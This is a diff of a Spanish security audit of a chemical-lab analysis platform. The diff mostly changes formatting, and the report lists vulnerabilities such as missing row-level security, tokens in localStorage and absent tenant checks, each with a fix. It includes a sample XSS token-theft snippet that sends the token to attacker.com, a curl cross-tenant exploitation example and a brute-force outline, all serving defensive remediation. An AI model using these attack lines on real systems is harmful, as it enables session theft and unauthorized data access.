@@ -1,4 +1,5 @@
 # ANÁLISIS DE CIBERSEGURIDAD - EVOLUTION CHEMICAL
+
 ## Proyecto: Sistema de Gestión de Análisis Químicos
 
 **Fecha de Análisis:** 2026-05-25
@@ -29,12 +30,14 @@
 El sistema presenta una **arquitectura de seguridad parcialmente implementada** con vulnerabilidades críticas que requieren atención inmediata:
 
 #### Problemas Críticos (Prioridad Alta):
+
 1. **❌ CRÍTICO:** Base de datos SIN Row Level Security (RLS) - Cualquier usuario autenticado puede acceder a datos de otras empresas a nivel de BD
 2. **❌ CRÍTICO:** Tokens JWT almacenados en localStorage - Vulnerable a ataques XSS
 3. **⚠️ ALTO:** ChromatographyViewSet sin validación de permisos por empresa - Cualquier usuario autenticado puede ver/modificar análisis de otras empresas
 4. **⚠️ ALTO:** CORS_ALLOW_ALL_ORIGINS en desarrollo - Riesgo de CSRF en entorno de desarrollo
 
 #### Fortalezas Identificadas:
+
 - ✅ Autenticación robusta con Supabase
 - ✅ RBAC implementado (Owner/Company Admin)
 - ✅ Rate limiting configurado
@@ -49,11 +52,13 @@ El sistema presenta una **arquitectura de seguridad parcialmente implementada** 
 ### Contexto de Seguridad
 
 **Empresa Propietaria (Laboratorio):**
+
 - `company_id = '45a7324c-931e-455a-be9a-5bf3d0492985'`
 - Usuarios con este company_id tienen acceso TOTAL
 - Usuarios con `role = 'owner'` tienen acceso TOTAL
 
 **Empresas Clientes:**
+
 - Todas las demás empresas
 - Solo pueden acceder a sus propios datos
 - Usuarios con `role = 'company_admin'` solo ven datos de su empresa
@@ -61,6 +66,7 @@ El sistema presenta una **arquitectura de seguridad parcialmente implementada** 
 ### Estado Actual: ⚠️ SIN ROW LEVEL SECURITY (RLS)
 
 **Implicaciones:**
+
 ```
 ┌─────────────────────────────────────────────────────┐
 │  PROBLEMA: Base de datos completamente abierta      │
@@ -81,6 +87,7 @@ El sistema presenta una **arquitectura de seguridad parcialmente implementada** 
 ### Tablas Críticas Sin RLS
 
 #### 1. `user_profiles` - **CRÍTICO**
+
 ```sql
 -- Estado actual: SIN PROTECCIÓN
 -- Riesgo: Exposición de emails, roles, company_id de todos los usuarios
@@ -88,6 +95,7 @@ El sistema presenta una **arquitectura de seguridad parcialmente implementada** 
 ```
 
 **Datos expuestos:**
+
 - ✗ user_id (UUIDs de todos los usuarios)
 - ✗ name (nombres completos)
 - ✗ email (correos electrónicos)
@@ -95,6 +103,7 @@ El sistema presenta una **arquitectura de seguridad parcialmente implementada** 
 - ✗ role (roles de acceso)
 
 #### 2. `companies` - **CRÍTICO**
+
 ```sql
 -- Estado actual: SIN PROTECCIÓN
 -- Riesgo: Listado completo de clientes del laboratorio
@@ -102,12 +111,14 @@ El sistema presenta una **arquitectura de seguridad parcialmente implementada** 
 ```
 
 **Datos expuestos:**
+
 - ✗ Nombres de todas las empresas clientes
 - ✗ Teléfonos y emails de contacto
 - ✗ Localidades (información comercial sensible)
 - ✗ Permisos (can_view_results)
 
 #### 3. `chromatographic_analyses` - **CRÍTICO**
+
 ```sql
 -- Estado actual: SIN PROTECCIÓN
 -- Riesgo: Resultados de análisis químicos de competidores
@@ -115,36 +126,42 @@ El sistema presenta una **arquitectura de seguridad parcialmente implementada** 
 ```
 
 **Datos expuestos:**
+
 - ✗ Composición química completa de muestras
 - ✗ Propiedades calculadas (ventaja competitiva)
 - ✗ Nombres de campos y pozos (información estratégica)
 - ✗ Informes HTML completos
 
 #### 4. `samples` - **ALTO**
+
 ```sql
 -- Estado actual: SIN PROTECCIÓN
 -- Riesgo: Información sobre muestras y análisis solicitados
 ```
 
 **Datos expuestos:**
+
 - ✗ Códigos internos de muestras
 - ✗ Tipos de análisis solicitados
 - ✗ Fechas de muestreo
 - ✗ Emails de contacto
 
 #### 5. `analyses` - **MEDIO**
+
 ```sql
 -- Estado actual: SIN PROTECCIÓN
 -- Riesgo: Resultados de análisis generales
 ```
 
 #### 6. `reports` - **MEDIO**
+
 ```sql
 -- Estado actual: SIN PROTECCIÓN
 -- Riesgo: Rutas de archivos de reportes
 ```
 
 #### 7. `compounds` - **BAJO**
+
 ```sql
 -- Estado actual: SIN PROTECCIÓN
 -- Riesgo: Datos de referencia públicos (aceptable sin RLS)
@@ -617,6 +634,7 @@ $$;
 **Archivo:** `apps/chromatography/views.py`
 
 **Problema:**
+
 ```python
 class ChromatographicAnalysisViewSet(viewsets.ModelViewSet):
     permission_classes = [permissions.IsAuthenticated]  # ❌ SOLO IsAuthenticated
@@ -624,6 +642,7 @@ class ChromatographicAnalysisViewSet(viewsets.ModelViewSet):
 ```
 
 **Impacto:**
+
 - Cualquier usuario autenticado puede:
   - ✗ Ver análisis de TODAS las empresas
   - ✗ Modificar análisis de otras empresas
@@ -632,6 +651,7 @@ class ChromatographicAnalysisViewSet(viewsets.ModelViewSet):
   - ✗ Generar reportes de cualquier empresa
 
 **Evidencia de código:**
+
 ```python
 # Endpoint: POST /api/v1/chromatography/analyses/upload-xlsx/
 @action(detail=False, methods=["POST"])
@@ -642,6 +662,7 @@ def upload_xlsx(self, request):
 ```
 
 **Explotación:**
+
 ```bash
 # Un usuario de empresa A puede subir análisis para empresa B
 curl -X POST \
@@ -652,6 +673,7 @@ curl -X POST \
 ```
 
 **Solución requerida:**
+
 ```python
 # Agregar validación de permisos
 permission_classes = [permissions.IsAuthenticated, CanManageAnalyses]
@@ -671,16 +693,19 @@ def upload_xlsx(self, request):
 **Archivo:** `config/settings/development.py`
 
 **Problema:**
+
 ```python
 CORS_ALLOW_ALL_ORIGINS = True  # ❌ Acepta requests desde cualquier origen
 ```
 
 **Impacto:**
+
 - Vulnerable a CSRF desde cualquier dominio
 - Un sitio malicioso puede hacer requests autenticados si el usuario tiene la sesión abierta
 - No hay validación de origen en desarrollo
 
 **Solución requerida:**
+
 ```python
 # development.py
 CORS_ALLOWED_ORIGINS = [
@@ -695,6 +720,7 @@ CORS_ALLOW_CREDENTIALS = True
 **Archivo:** `apps/authentication/views.py`
 
 **Problema:**
+
 ```python
 class LogoutView(APIView):
     def post(self, request):
@@ -705,11 +731,13 @@ class LogoutView(APIView):
 ```
 
 **Impacto:**
+
 - El token JWT sigue siendo válido después del logout
 - Si un atacante obtiene el token, puede usarlo hasta que expire naturalmente
 - No hay revocación real de sesión
 
 **Solución requerida:**
+
 ```python
 def post(self, request):
     try:
@@ -734,6 +762,7 @@ def post(self, request):
 **Archivo:** `config/settings/base.py`
 
 **Problema:**
+
 ```python
 CACHES = {
     'default': {
@@ -745,11 +774,13 @@ CACHES = {
 ```
 
 **Impacto:**
+
 - En un entorno con múltiples instancias (load balancer), cada instancia tiene su propio cache
 - Validaciones de JWT pueden ser inconsistentes
 - Invalidación de cache (logout) solo afecta a una instancia
 
 **Solución requerida:**
+
 ```python
 # Usar Redis para cache distribuido
 CACHES = {
@@ -768,17 +799,20 @@ CACHES = {
 **Archivo:** `config/settings/base.py`
 
 **Problema:**
+
 ```python
 SECRET_KEY = env("SECRET_KEY", default="django-insecure-default-key")
 # ❌ Tiene un default que podría usarse en producción por error
 ```
 
 **Impacto:**
+
 - Si la variable de entorno no está configurada, usa un valor predecible
 - Permite firmar tokens Django, cookies de sesión
 - Compromete la seguridad de toda la aplicación
 
 **Solución requerida:**
+
 ```python
 # Forzar que SECRET_KEY exista en producción
 if env("ENVIRONMENT") == "production":
@@ -792,6 +826,7 @@ else:
 **Archivo:** `apps/authentication/authentication.py`
 
 **Problema:**
+
 ```python
 # Inicializa cliente con anon_key
 supabase_client = create_client(
@@ -801,11 +836,13 @@ supabase_client = create_client(
 ```
 
 **Impacto:**
+
 - anon_key está diseñado para el frontend (público)
 - service_role_key debe usarse en el backend para operaciones administrativas
 - Podría haber limitaciones en queries complejos o RLS bypass
 
 **Solución requerida:**
+
 ```python
 # Usar service_role_key en backend
 supabase_admin_client = create_client(
@@ -819,17 +856,20 @@ supabase_admin_client = create_client(
 **Archivo:** `config/settings/production.py`
 
 **Problema:**
+
 ```python
 SECURE_SSL_REDIRECT = env.bool("SECURE_SSL_REDIRECT", default=False)
 # ⚠️ Debería ser True por defecto en producción
 ```
 
 **Impacto:**
+
 - Permite conexiones HTTP sin redirigir a HTTPS
 - Riesgo de man-in-the-middle
 - Tokens y credenciales podrían transmitirse sin cifrar
 
 **Solución requerida:**
+
 ```python
 SECURE_SSL_REDIRECT = True  # Forzar HTTPS en producción
 ```
@@ -839,6 +879,7 @@ SECURE_SSL_REDIRECT = True  # Forzar HTTPS en producción
 **Archivo:** `config/settings/base.py`
 
 **Problema:**
+
 ```python
 'DEFAULT_THROTTLE_RATES': {
     'anon': '100/hour',  # ⚠️ Permite 100 requests/hora sin autenticación
@@ -847,10 +888,12 @@ SECURE_SSL_REDIRECT = True  # Forzar HTTPS en producción
 ```
 
 **Impacto:**
+
 - Rate limits muy altos permiten ataques de fuerza bruta
 - Login endpoint sin rate limit específico más restrictivo
 
 **Solución requerida:**
+
 ```python
 'DEFAULT_THROTTLE_RATES': {
     'anon': '20/hour',        # Más restrictivo para anónimos
@@ -869,6 +912,7 @@ SECURE_SSL_REDIRECT = True  # Forzar HTTPS en producción
 **Archivo:** `src/modules/auth/services/AuthService/AuthService.ts`
 
 **Problema:**
+
 ```typescript
 // ❌ Almacena tokens en localStorage
 localStorage.setItem('accessToken', token);
@@ -876,6 +920,7 @@ localStorage.setItem('refreshToken', refreshToken);
 ```
 
 **Impacto:**
+
 - **Vulnerable a XSS (Cross-Site Scripting)**
 - Cualquier script malicioso puede acceder a los tokens:
   ```javascript
@@ -883,19 +928,21 @@ localStorage.setItem('refreshToken', refreshToken);
   const token = localStorage.getItem('accessToken');
   fetch('https://attacker.com/steal', {
     method: 'POST',
-    body: JSON.stringify({ token })
+    body: JSON.stringify({ token }),
   });
   ```
 - No hay protección de httpOnly
 - Accesible desde cualquier JavaScript en el dominio
 
 **Vectores de ataque:**
+
 1. **XSS Reflejado:** URL maliciosa con script
 2. **XSS Almacenado:** Comentario/campo con script inyectado
 3. **Extensión maliciosa del navegador**
 4. **Third-party script comprometido**
 
 **Solución requerida:**
+
 ```typescript
 // Opción 1: Usar httpOnly cookies (RECOMENDADO)
 // Backend debe enviar cookies en lugar de tokens en response
@@ -921,25 +968,29 @@ class AuthService {
 **Archivo:** `.env.local`
 
 **Problema:**
+
 ```bash
 NEXT_PUBLIC_API_URL=http://localhost:8000/api/v1
 # ⚠️ NEXT_PUBLIC_ expone la variable en el bundle del cliente
 ```
 
 **Impacto:**
+
 - URL del API visible en el código JavaScript del cliente
 - Facilita reconocimiento del backend
 - No es crítico si el API es público, pero expone información
 
 **Evidencia:**
+
 ```javascript
 // En el bundle de producción:
-var API_URL = "https://api.evolutionchemical.com/api/v1";
+var API_URL = 'https://api.evolutionchemical.com/api/v1';
 // Visible en DevTools > Sources
 ```
 
 **Mitigación:**
-- Esto es esperado con Next.js (variables NEXT_PUBLIC_ son públicas)
+
+- Esto es esperado con Next.js (variables NEXT*PUBLIC* son públicas)
 - Asegurar que el backend tenga protecciones adecuadas
 - No confiar en "seguridad por oscuridad"
 
@@ -948,6 +999,7 @@ var API_URL = "https://api.evolutionchemical.com/api/v1";
 **Archivo:** `src/modules/auth/services/AuthService/AuthService.ts`
 
 **Problema:**
+
 ```typescript
 private isTokenExpired(token: string): boolean {
   const decoded = jwtDecode<JWTPayload>(token);
@@ -957,17 +1009,20 @@ private isTokenExpired(token: string): boolean {
 ```
 
 **Impacto:**
+
 - La firma NO se valida en el cliente
 - Un atacante podría modificar el payload del token
 - **Mitigado:** El backend SÍ valida la firma (correcto)
 
 **Aclaración:**
+
 - Este patrón es aceptable si:
   - Solo se usa para UI/UX (mostrar nombre, rol)
   - Backend SIEMPRE valida la firma
   - NO se toman decisiones de seguridad en base al token decodificado
 
 **Recomendación:**
+
 ```typescript
 // Agregar comentario de advertencia
 /**
@@ -987,19 +1042,22 @@ private isTokenExpired(token: string): boolean {
 **Archivo:** `next.config.js`
 
 **Problema:**
+
 ```javascript
 // ❌ No hay headers de seguridad configurados
 module.exports = {
   // Sin CSP
-}
+};
 ```
 
 **Impacto:**
+
 - No hay protección contra XSS a nivel de navegador
 - Scripts inline pueden ejecutarse sin restricción
 - Recursos pueden cargarse desde cualquier origen
 
 **Solución requerida:**
+
 ```javascript
 // next.config.js
 module.exports = {
@@ -1019,29 +1077,29 @@ module.exports = {
               "connect-src 'self' https://api.evolutionchemical.com",
               "frame-ancestors 'none'",
               "base-uri 'self'",
-              "form-action 'self'"
-            ].join('; ')
+              "form-action 'self'",
+            ].join('; '),
           },
           {
             key: 'X-Frame-Options',
-            value: 'DENY'
+            value: 'DENY',
           },
           {
             key: 'X-Content-Type-Options',
-            value: 'nosniff'
+            value: 'nosniff',
           },
           {
             key: 'Referrer-Policy',
-            value: 'strict-origin-when-cross-origin'
+            value: 'strict-origin-when-cross-origin',
           },
           {
             key: 'Permissions-Policy',
-            value: 'camera=(), microphone=(), geolocation=()'
-          }
-        ]
-      }
+            value: 'camera=(), microphone=(), geolocation=()',
+          },
+        ],
+      },
     ];
-  }
+  },
 };
 ```
 
@@ -1050,6 +1108,7 @@ module.exports = {
 **Archivo:** `src/modules/auth/services/AuthService/AuthService.ts`
 
 **Problema:**
+
 ```typescript
 async logout(): Promise<void> {
   try {
@@ -1065,11 +1124,13 @@ async logout(): Promise<void> {
 ```
 
 **Impacto:**
+
 - Si el backend falla, el token sigue válido en el servidor
 - El usuario cree que cerró sesión, pero el token aún funciona
 - Posible inconsistencia de estado
 
 **Solución requerida:**
+
 ```typescript
 async logout(): Promise<void> {
   try {
@@ -1096,16 +1157,19 @@ async logout(): Promise<void> {
 **Archivo:** Varios componentes usan sessionStorage
 
 **Problema:**
+
 ```typescript
 // ⚠️ Almacena nombre en sessionStorage
 window.sessionStorage.setItem('login-welcome-name', name);
 ```
 
 **Impacto:**
+
 - sessionStorage también es accesible a JavaScript (vulnerable a XSS)
 - Aunque son datos menos sensibles (nombre de bienvenida)
 
 **Mitigación:**
+
 - Estos datos no son críticos
 - Aceptable para datos de UI/UX
 
@@ -1114,10 +1178,12 @@ window.sessionStorage.setItem('login-welcome-name', name);
 **Archivo:** Configuración de Next.js
 
 **Problema:**
+
 - No hay redirección forzada a HTTPS en configuración de Next.js
 - Depende del servidor web (Vercel, Nginx, etc.)
 
 **Solución requerida:**
+
 ```javascript
 // next.config.js (para producción self-hosted)
 if (process.env.NODE_ENV === 'production') {
@@ -1133,6 +1199,7 @@ if (process.env.NODE_ENV === 'production') {
 ### Vector 1: ⚠️ CRÍTICO - Acceso Directo a Base de Datos
 
 **Escenario:**
+
 ```
 1. Atacante obtiene anon_key de Supabase (visible en requests del frontend)
 2. Atacante obtiene un JWT válido (phishing, XSS, etc.)
@@ -1171,6 +1238,7 @@ if (process.env.NODE_ENV === 'production') {
 ### Vector 2: ⚠️ ALTO - Cross-Site Scripting (XSS) + Robo de Tokens
 
 **Escenario:**
+
 ```
 1. Atacante encuentra vulnerabilidad XSS en la aplicación
    - Campo de texto sin sanitizar
@@ -1205,12 +1273,14 @@ if (process.env.NODE_ENV === 'production') {
 **Impacto:** ALTO (compromiso de cuenta, acceso a datos sensibles)
 
 **Controles Mitigantes Actuales:**
+
 - ✅ TypeScript reduce errores
 - ✅ React escapa HTML por defecto
 - ❌ Sin CSP
 - ❌ Tokens en localStorage (vulnerable)
 
 **Remediación:**
+
 1. Migrar a httpOnly cookies
 2. Implementar CSP estricto
 3. Auditar inputs para XSS
@@ -1220,6 +1290,7 @@ if (process.env.NODE_ENV === 'production') {
 ### Vector 3: ⚠️ ALTO - Escalación de Privilegios en Cromatografía
 
 **Escenario:**
+
 ```
 1. Atacante crea cuenta como COMPANY_ADMIN de Empresa A
 2. Obtiene token JWT válido
@@ -1246,11 +1317,13 @@ Content-Type: multipart/form-data
 **Impacto:** ALTO (acceso no autorizado a datos de otras empresas)
 
 **Controles Mitigantes Actuales:**
+
 - ✅ Autenticación requerida
 - ❌ Sin validación de company_id contra usuario
 - ❌ Sin CanManageAnalyses permission
 
 **Remediación:**
+
 ```python
 # En ChromatographicAnalysisViewSet
 def upload_xlsx(self, request):
@@ -1269,6 +1342,7 @@ def upload_xlsx(self, request):
 ### Vector 4: ⚠️ MEDIO - CSRF en Desarrollo
 
 **Escenario:**
+
 ```
 1. Víctima autenticada navega a sitio malicioso
 2. Sitio malicioso hace request a API en desarrollo:
@@ -1290,10 +1364,12 @@ def upload_xlsx(self, request):
 **Impacto:** MEDIO (modificación/eliminación de datos)
 
 **Controles Mitigantes Actuales:**
+
 - ❌ CORS permisivo en desarrollo
 - ✅ CORS restringido en producción
 
 **Remediación:**
+
 - Restringir CORS incluso en desarrollo
 
 ---
@@ -1301,6 +1377,7 @@ def upload_xlsx(self, request):
 ### Vector 5: ⚠️ MEDIO - Reutilización de Token después de Logout
 
 **Escenario:**
+
 ```
 1. Usuario hace logout en la aplicación
 2. Sistema limpia localStorage
@@ -1315,11 +1392,13 @@ def upload_xlsx(self, request):
 **Impacto:** MEDIO (acceso no autorizado post-logout)
 
 **Controles Mitigantes Actuales:**
+
 - ✅ Cache se limpia
 - ❌ Token no se invalida en Supabase
 - ❌ Sin lista negra de tokens
 
 **Remediación:**
+
 ```python
 # En LogoutView
 def post(self, request):
@@ -1337,6 +1416,7 @@ def post(self, request):
 ### Vector 6: ⚠️ BAJO - Fuerza Bruta en Login
 
 **Escenario:**
+
 ```
 1. Atacante obtiene lista de emails (de LinkedIn, breaches, etc.)
 2. Atacante ejecuta ataque de fuerza bruta:
@@ -1354,11 +1434,13 @@ for password in common_passwords:
 **Impacto:** MEDIO (compromiso de cuenta con contraseña débil)
 
 **Controles Mitigantes Actuales:**
+
 - ✅ Rate limit general: 100/hora
 - ❌ Sin rate limit específico para login
 - ❌ Sin lockout después de X intentos fallidos
 
 **Remediación:**
+
 ```python
 # En LoginView, agregar throttle específico
 class LoginView(APIView):
@@ -1383,14 +1465,14 @@ class LoginView(APIView):
 
 ### 1. Datos Expuestos por Falta de RLS
 
-| Tabla | Datos Sensibles | Nivel de Criticidad | Impacto Comercial |
-|-------|----------------|---------------------|-------------------|
-| `companies` | Nombres, contactos, localidades | ⚠️ ALTO | Competidores conocen cartera de clientes |
-| `chromatographic_analyses` | Composición química, propiedades | ❌ CRÍTICO | Ventaja competitiva comprometida |
-| `user_profiles` | Emails, roles, company_id | ⚠️ ALTO | Phishing dirigido, ingeniería social |
-| `samples` | Códigos, tipos de análisis | ⚠️ MEDIO | Información operativa de clientes |
-| `analyses` | Resultados de análisis | ⚠️ ALTO | Datos técnicos sensibles |
-| `reports` | Rutas de archivos | ⚠️ BAJO | Path disclosure |
+| Tabla                      | Datos Sensibles                  | Nivel de Criticidad | Impacto Comercial                        |
+| -------------------------- | -------------------------------- | ------------------- | ---------------------------------------- |
+| `companies`                | Nombres, contactos, localidades  | ⚠️ ALTO             | Competidores conocen cartera de clientes |
+| `chromatographic_analyses` | Composición química, propiedades | ❌ CRÍTICO          | Ventaja competitiva comprometida         |
+| `user_profiles`            | Emails, roles, company_id        | ⚠️ ALTO             | Phishing dirigido, ingeniería social     |
+| `samples`                  | Códigos, tipos de análisis       | ⚠️ MEDIO            | Información operativa de clientes        |
+| `analyses`                 | Resultados de análisis           | ⚠️ ALTO             | Datos técnicos sensibles                 |
+| `reports`                  | Rutas de archivos                | ⚠️ BAJO             | Path disclosure                          |
 
 ### 2. Datos Expuestos en Frontend (localStorage)
 
@@ -1410,6 +1492,7 @@ class LoginView(APIView):
 ```
 
 **Riesgos:**
+
 - Accesible a cualquier script JavaScript (XSS)
 - Accesible a extensiones del navegador
 - No se limpia automáticamente (persiste entre sesiones)
@@ -1418,6 +1501,7 @@ class LoginView(APIView):
 ### 3. Datos Expuestos en Variables de Entorno
 
 **Backend (.env):**
+
 ```bash
 # ❌ CRÍTICO: Credenciales en texto plano
 SECRET_KEY=django-secret-key-here
@@ -1430,19 +1514,22 @@ DB_HOST=db.xxx.supabase.co
 ```
 
 **Frontend (.env.local):**
+
 ```bash
 # ⚠️ MEDIO: Visible en bundle
 NEXT_PUBLIC_API_URL=https://api.evolutionchemical.com/api/v1
 ```
 
 **Riesgos:**
+
 - Si .env se commitea a Git, queda expuesto permanentemente
 - Backups de servidor pueden incluir credenciales
-- NEXT_PUBLIC_ variables terminan en el bundle del cliente
+- NEXT*PUBLIC* variables terminan en el bundle del cliente
 
 ### 4. Datos Expuestos en Logs
 
 **Backend logs pueden incluir:**
+
 ```python
 # LoggingMiddleware registra:
 logger.info(f"Request: {request.method} {request.path}")
@@ -1451,6 +1538,7 @@ logger.info(f"Request: {request.method} {request.path}")
 ```
 
 **Recomendación:**
+
 - Sanitizar logs para no incluir PII
 - Enmascarar tokens en logs
 - Rotar logs frecuentemente
@@ -1458,6 +1546,7 @@ logger.info(f"Request: {request.method} {request.path}")
 ### 5. Datos Expuestos en Respuestas de API
 
 **Ejemplo: GET /api/v1/auth/me**
+
 ```json
 {
   "user_id": "uuid",
@@ -1465,11 +1554,12 @@ logger.info(f"Request: {request.method} {request.path}")
   "name": "Usuario Nombre",
   "role": "company_admin",
   "company_id": "uuid",
-  "company_name": "Empresa Cliente"  // ⚠️ Expone nombre de empresa
+  "company_name": "Empresa Cliente" // ⚠️ Expone nombre de empresa
 }
 ```
 
 **Minimización recomendada:**
+
 - Solo devolver datos necesarios para el frontend
 - Evitar exponer IDs internos si es posible
 - Usar DTOs para controlar exactamente qué se expone
@@ -1480,32 +1570,35 @@ logger.info(f"Request: {request.method} {request.path}")
 
 ### Clasificación de Riesgos
 
-| # | Vulnerabilidad | Probabilidad | Impacto | Riesgo | Prioridad |
-|---|---------------|--------------|---------|--------|-----------|
-| 1 | Base de datos sin RLS | 🔴 ALTA | 🔴 CRÍTICO | 🔴 **CRÍTICO** | **P0** |
-| 2 | Tokens en localStorage (XSS) | 🟡 MEDIA | 🔴 ALTO | 🔴 **ALTO** | **P1** |
-| 3 | ChromatographyViewSet sin RBAC | 🔴 ALTA | 🔴 ALTO | 🔴 **ALTO** | **P0** |
-| 4 | CORS permisivo en desarrollo | 🟡 MEDIA | 🟡 MEDIO | 🟡 **MEDIO** | **P2** |
-| 5 | Logout no invalida token | 🟡 MEDIA | 🟡 MEDIO | 🟡 **MEDIO** | **P2** |
-| 6 | Sin CSP | 🟡 MEDIA | 🔴 ALTO | 🔴 **ALTO** | **P1** |
-| 7 | Cache en memoria (no escalable) | 🟡 MEDIA | 🟡 MEDIO | 🟡 **MEDIO** | **P2** |
-| 8 | SSL redirect deshabilitado | 🟢 BAJA | 🔴 ALTO | 🟡 **MEDIO** | **P2** |
-| 9 | Rate limiting generoso | 🟢 BAJA | 🟡 MEDIO | 🟢 **BAJO** | **P3** |
-| 10 | SECRET_KEY con default | 🟢 BAJA | 🔴 ALTO | 🟡 **MEDIO** | **P2** |
-| 11 | Uso de anon_key vs service_role | 🟢 BAJA | 🟡 MEDIO | 🟢 **BAJO** | **P3** |
+| #   | Vulnerabilidad                  | Probabilidad | Impacto    | Riesgo         | Prioridad |
+| --- | ------------------------------- | ------------ | ---------- | -------------- | --------- |
+| 1   | Base de datos sin RLS           | 🔴 ALTA      | 🔴 CRÍTICO | 🔴 **CRÍTICO** | **P0**    |
+| 2   | Tokens en localStorage (XSS)    | 🟡 MEDIA     | 🔴 ALTO    | 🔴 **ALTO**    | **P1**    |
+| 3   | ChromatographyViewSet sin RBAC  | 🔴 ALTA      | 🔴 ALTO    | 🔴 **ALTO**    | **P0**    |
+| 4   | CORS permisivo en desarrollo    | 🟡 MEDIA     | 🟡 MEDIO   | 🟡 **MEDIO**   | **P2**    |
+| 5   | Logout no invalida token        | 🟡 MEDIA     | 🟡 MEDIO   | 🟡 **MEDIO**   | **P2**    |
+| 6   | Sin CSP                         | 🟡 MEDIA     | 🔴 ALTO    | 🔴 **ALTO**    | **P1**    |
+| 7   | Cache en memoria (no escalable) | 🟡 MEDIA     | 🟡 MEDIO   | 🟡 **MEDIO**   | **P2**    |
+| 8   | SSL redirect deshabilitado      | 🟢 BAJA      | 🔴 ALTO    | 🟡 **MEDIO**   | **P2**    |
+| 9   | Rate limiting generoso          | 🟢 BAJA      | 🟡 MEDIO   | 🟢 **BAJO**    | **P3**    |
+| 10  | SECRET_KEY con default          | 🟢 BAJA      | 🔴 ALTO    | 🟡 **MEDIO**   | **P2**    |
+| 11  | Uso de anon_key vs service_role | 🟢 BAJA      | 🟡 MEDIO   | 🟢 **BAJO**    | **P3**    |
 
 ### Leyenda de Probabilidad
+
 - 🔴 **ALTA:** Muy fácil de explotar, herramientas públicas disponibles
 - 🟡 **MEDIA:** Requiere conocimientos técnicos moderados
 - 🟢 **BAJA:** Requiere conocimientos avanzados o condiciones específicas
 
 ### Leyenda de Impacto
+
 - 🔴 **CRÍTICO:** Compromiso total del sistema, pérdida de datos, daño reputacional
 - 🔴 **ALTO:** Acceso no autorizado a datos sensibles, modificación de datos
 - 🟡 **MEDIO:** Degradación del servicio, exposición limitada de datos
 - 🟢 **BAJO:** Impacto mínimo, información técnica expuesta
 
 ### Leyenda de Prioridad
+
 - **P0:** INMEDIATO (0-1 semana)
 - **P1:** URGENTE (1-2 semanas)
 - **P2:** ALTA (2-4 semanas)
@@ -1518,9 +1611,11 @@ logger.info(f"Request: {request.method} {request.path}")
 ### 🔴 P0: INMEDIATO (Debe hacerse YA)
 
 #### 1. Implementar Row Level Security en Supabase
+
 **Impacto:** Protege la base de datos a nivel fundamental
 
 **Acciones:**
+
 ```sql
 -- 1. Habilitar RLS en todas las tablas críticas
 ALTER TABLE user_profiles ENABLE ROW LEVEL SECURITY;
@@ -1540,9 +1635,11 @@ ALTER TABLE reports ENABLE ROW LEVEL SECURITY;
 ---
 
 #### 2. Agregar Validación de Permisos en ChromatographyViewSet
+
 **Impacto:** Previene acceso no autorizado a análisis de otras empresas
 
 **Acciones:**
+
 ```python
 # apps/chromatography/views.py
 
@@ -1582,6 +1679,7 @@ class ChromatographicAnalysisViewSet(viewsets.ModelViewSet):
 **Tiempo estimado:** 2-3 horas (testing incluido)
 **Responsable:** Backend Developer
 **Verificación:**
+
 - Usuario de empresa A intenta subir análisis para empresa B → 403 Forbidden
 - Usuario de empresa A intenta ver análisis de empresa B → 403 Forbidden
 - OWNER puede hacer todo → Success
@@ -1591,9 +1689,11 @@ class ChromatographicAnalysisViewSet(viewsets.ModelViewSet):
 ### 🔴 P1: URGENTE (1-2 semanas)
 
 #### 3. Migrar a httpOnly Cookies para Tokens
+
 **Impacto:** Protege contra XSS
 
 **Acciones Backend:**
+
 ```python
 # apps/authentication/views.py
 
@@ -1630,6 +1730,7 @@ class LoginView(APIView):
 ```
 
 **Acciones Frontend:**
+
 ```typescript
 // src/modules/auth/services/AuthService/AuthService.ts
 
@@ -1659,9 +1760,11 @@ class AuthService {
 ---
 
 #### 4. Implementar Content Security Policy (CSP)
+
 **Impacto:** Protección contra XSS a nivel de navegador
 
 **Acciones:**
+
 ```javascript
 // next.config.js
 
@@ -1682,25 +1785,25 @@ module.exports = {
               "connect-src 'self' https://api.evolutionchemical.com https://*.supabase.co",
               "frame-ancestors 'none'",
               "base-uri 'self'",
-              "form-action 'self'"
-            ].join('; ')
+              "form-action 'self'",
+            ].join('; '),
           },
           {
             key: 'X-Frame-Options',
-            value: 'DENY'
+            value: 'DENY',
           },
           {
             key: 'X-Content-Type-Options',
-            value: 'nosniff'
+            value: 'nosniff',
           },
           {
             key: 'Referrer-Policy',
-            value: 'strict-origin-when-cross-origin'
-          }
-        ]
-      }
+            value: 'strict-origin-when-cross-origin',
+          },
+        ],
+      },
     ];
-  }
+  },
 };
 ```
 
@@ -1713,6 +1816,7 @@ module.exports = {
 ### 🟡 P2: ALTA (2-4 semanas)
 
 #### 5. Restringir CORS en Desarrollo
+
 ```python
 # config/settings/development.py
 CORS_ALLOWED_ORIGINS = [
@@ -1723,6 +1827,7 @@ CORS_ALLOW_CREDENTIALS = True
 ```
 
 #### 6. Invalidar Tokens en Logout
+
 ```python
 # apps/authentication/views.py
 def post(self, request):
@@ -1734,6 +1839,7 @@ def post(self, request):
 ```
 
 #### 7. Migrar Cache a Redis
+
 ```python
 # config/settings/base.py
 CACHES = {
@@ -1748,12 +1854,14 @@ CACHES = {
 ```
 
 #### 8. Forzar SSL Redirect
+
 ```python
 # config/settings/production.py
 SECURE_SSL_REDIRECT = True  # Forzar HTTPS
 ```
 
 #### 9. Eliminar Default de SECRET_KEY
+
 ```python
 # config/settings/base.py
 if env("ENVIRONMENT") == "production":
@@ -1767,6 +1875,7 @@ else:
 ### 🟢 P3: MEDIA (1-2 meses)
 
 #### 10. Rate Limiting Más Restrictivo
+
 ```python
 'DEFAULT_THROTTLE_RATES': {
     'anon': '20/hour',
@@ -1776,6 +1885,7 @@ else:
 ```
 
 #### 11. Usar service_role_key en Backend
+
 ```python
 supabase_admin_client = create_client(
     env("SUPABASE_URL"),
@@ -1784,6 +1894,7 @@ supabase_admin_client = create_client(
 ```
 
 #### 12. Auditoría de Logs
+
 - Sanitizar logs para no incluir PII
 - Implementar log rotation
 - Monitoreo de accesos sospechosos
@@ -1793,6 +1904,7 @@ supabase_admin_client = create_client(
 ## PLAN DE REMEDIACIÓN
 
 ### Fase 1: Crítico (Semana 1)
+
 ```
 Día 1-2: Implementar RLS en Supabase
 - Habilitar RLS en todas las tablas
@@ -1814,6 +1926,7 @@ Día 5: Testing integral y deployment
 ```
 
 ### Fase 2: Urgente (Semana 2-3)
+
 ```
 Semana 2: Migrar a httpOnly Cookies
 - Backend: Modificar endpoints de auth
@@ -1829,6 +1942,7 @@ Semana 3: Implementar CSP y Headers de Seguridad
 ```
 
 ### Fase 3: Alta Prioridad (Semana 4-6)
+
 ```
